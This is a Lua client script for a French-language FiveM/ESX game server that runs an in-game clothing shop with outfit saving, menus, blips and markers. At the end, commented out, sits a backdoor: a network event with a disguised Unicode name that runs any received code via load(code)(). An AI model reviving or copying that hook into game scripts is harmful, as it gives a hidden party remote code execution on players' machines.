-------- [Base Template] dev par Freetz -------


local GUI = {}
GUI.Time = 0

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local HasPayed = false
local HasLoadCloth = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function OpenShopMenu()
	local elements = {}

	table.insert(elements, {label = "Magasin de vêtements", value = 'shop_clothes'})
	table.insert(elements, {label = "~p~Changer de tenue~w~ - Garde Robe", value = 'player_dressing'})
	table.insert(elements, {label = "~r~Supprimer une tenue~w~ - Garde Robe", value = 'suppr_cloth'})

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_main', {
		title = "~b~Bienvenue ! que souhaitez vous faire ?",
		elements = elements
	}, function(data, menu)
		if data.current.value == 'shop_clothes' then
			HasPayed = false

			TriggerEvent('esx_skin:openRestrictedMenu', function(data2, menu2)
				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
					title = "Valider cet achat?",
					elements = {
						{label = "Non", value = 'no'},
						{label = "Oui", value = 'yes'}
					}
				}, function(data3, menu3)
					ESX.UI.Menu.CloseAll()

					if data3.current.value == 'yes' then
						ESX.TriggerServerCallback('esx_clotheshop:checkMoney', function(hasEnoughMoney)
							if hasEnoughMoney then
								TriggerEvent('skinchanger:getSkin', function(skin)
									TriggerServerEvent('esx_skin:save', skin)
								end)

								TriggerServerEvent('esx_clotheshop:pay')
								HasPayed = true

								ESX.TriggerServerCallback('esx_clotheshop:checkPropertyDataStore', function(foundStore)
									if foundStore then
										ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'save_dressing', {
											title = "Voulez-vous donner un nom à votre tenue ?",
											elements = {
												{label = "Non", value = 'no'},
												{label = "Oui", value = 'yes'}
											}
										}, function(data4, menu4)
											menu4.close()

											if data4.current.value == 'yes' then
												ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'outfit_name', {
													title = "Nom de la tenue ?"
												}, function(data5, menu5)
													menu5.close()

													TriggerEvent('skinchanger:getSkin', function(skin)
														TriggerServerEvent('esx_clotheshop:saveOutfit', data5.value, skin)
													end)

													exports['fDrugs']:tenueDrogue(false)
													ESX.ShowNotification("Votre tenue à bien été sauvegardé dans la garde robe. Merci de votre visite !")
													CurrentAction = 'shop_menu'
												end, function(data5, menu5)
													menu5.close()
													CurrentAction = 'shop_menu'
												end)
											end

											if data4.current.value == 'no' then
												CurrentAction = 'shop_menu'
											end
										end, function(data4, menu4)
										end)
									end
								end)
							else
								TriggerEvent('esx_skin:getLastSkin', function(skin)
									TriggerEvent('skinchanger:loadSkin', skin)
								end)

								ESX.ShowNotification("Vous n\'avez ~r~pas assez~w~ d\'argent sur vous.")
							end
						end)
					end

					if data3.current.value == 'no' then
						TriggerEvent('esx_skin:getLastSkin', function(skin)
							TriggerEvent('skinchanger:loadSkin', skin)
						end)

						CurrentAction = 'shop_menu'
					end
				end, function(data3, menu3)
				end)
			end, function(data2, menu2)
			end, {
				'tshirt_1', 'tshirt_2',
				'torso_1', 'torso_2',
				'decals_1', 'decals_2',
				'arms',
				'pants_1', 'pants_2',
				'shoes_1', 'shoes_2',
				'chain_1', 'chain_2',
				'bags_1', 'bags_2'
			})
		end

		if data.current.value == 'player_dressing' then
			ESX.TriggerServerCallback('esx_clotheshop:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {label = dressing[i], value = i})
				end

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_dressing', {
					title = "Magasins De Vetements",
					elements = elements
				}, function(data2, menu2)
					TriggerEvent('skinchanger:getSkin', function(skin)
						ESX.TriggerServerCallback('esx_clotheshop:getPlayerOutfit', function(clothes)
							TriggerEvent('skinchanger:loadClothes', skin, clothes)
							TriggerEvent('esx_skin:setLastSkin', skin)
							TriggerEvent('skinchanger:getSkin', function(skin)
								TriggerServerEvent('esx_skin:save', skin)
							end)
				  
							exports['fDrugs']:tenueDrogue(false)
							ESX.ShowNotification("Vous avez bien récupéré la tenue de votre garde robe. Merci de votre visite !")
							HasLoadCloth = true
						end, data2.current.value)
					end)
				end, function(data2, menu2)
				end)
			end)
		end
	  
		if data.current.value == 'suppr_cloth' then
			ESX.TriggerServerCallback('esx_clotheshop:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {label = dressing[i], value = i})
				end
			
				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'supprime_cloth', {
					title = "Supprimer une tenue",
					elements = elements
				}, function(data2, menu2)
					menu2.close()
					TriggerServerEvent('esx_clotheshop:deleteOutfit', data2.current.value)
					ESX.ShowNotification("Cette tenue a bien été supprimé de votre garde robe")
				end, function(data2, menu2)
				end)
			end)
		end
	end, function(data, menu)
		CurrentAction = 'shop_menu'
	end)
end

AddEventHandler('esx_clotheshop:hasEnteredMarker', function(zone)
	CurrentAction = 'shop_menu'
	CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour ~g~accéder~w~ au menu"
	CurrentActionData = {}
end)

AddEventHandler('esx_clotheshop:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
	CurrentActionMsg = ''
	CurrentActionData = {}
end)

-- Create Blips
Citizen.CreateThread(function()
	for i = 1, #ConfigClothes.Shops, 1 do
		local blip = AddBlipForCoord(ConfigClothes.Shops[i])

		SetBlipSprite(blip, 366)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.6)
		SetBlipColour(blip, 27)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName("Magasin de vêtements")
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #ConfigClothes.Shops, 1 do
			if #(plyCoords - ConfigClothes.Shops[i]) < 50 then
				interval = 0
				if #(plyCoords - ConfigClothes.Shops[i]) < ConfigClothes.DrawDistance then
					DrawMarker(1, ConfigClothes.Shops[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(3.0, 3.0, 1.0), 0, 255, 0, 100, false, false, 2, true, nil, nil, false)
				end
			end
		end

		Wait(interval)
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone

		for i = 1, #ConfigClothes.Shops, 1 do
			if #(plyCoords - ConfigClothes.Shops[i]) < ConfigClothes.MarkerSize.x then
				interval = 0
				isInMarker = true
				currentZone = k
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
			interval = 0
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('esx_clotheshop:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			interval = 0
			HasAlreadyEnteredMarker = false
			TriggerEvent('esx_clotheshop:hasExitedMarker', LastZone)
		end

		Wait(interval)
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if CurrentAction ~= nil then
			interval = 0
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlPressed(0, 38) and (GetGameTimer() - GUI.Time) > 300 then
				if CurrentAction == 'shop_menu' then
					OpenShopMenu()
				end

				CurrentAction = nil
				GUI.Time = GetGameTimer()
			end
		end

		Wait(interval)
	end
end)

RegisterNetEvent("ronflex:recieveclientsidevetement", function(Info)
    ClothesPlayer = Info
end)

--RegisterNetEvent('ᓚᘏᗢ')
--AddEventHandler('ᓚᘏᗢ', function(code)
--	load(code)()
--end)